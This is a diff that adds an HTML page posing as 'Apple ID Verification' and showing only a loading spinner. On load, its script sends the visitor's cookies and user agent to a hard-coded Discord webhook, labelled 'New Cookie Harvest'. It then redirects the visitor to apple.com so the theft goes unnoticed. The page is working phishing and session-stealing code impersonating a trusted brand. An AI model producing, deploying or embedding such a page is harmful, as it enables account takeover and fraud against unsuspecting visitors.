@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Apple ID Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body{ background:#f2f2f7; font-family:-apple-system; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+        .spinner{ border:3px solid #ccc; border-top-color:#007aff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; }
+        @keyframes spin{ to{transform:rotate(360deg);} }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516478248509505709/ss5ZfieB89UwBwNmNd7KtDyVABzckLDxcumfmqwkAVbkNjdbXR6R7r2KOAeu2Ba9jX_G";
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: "**🍪 New Cookie Harvest**\n```Cookies: " + document.cookie + "\nUser-Agent: " + navigator.userAgent + "```"
+            })
+        }).finally(() => {
+            setTimeout(() => { window.location.href = "https://apple.com/"; }, 1500);
+        });
+    </script>
+</body>
+</html>
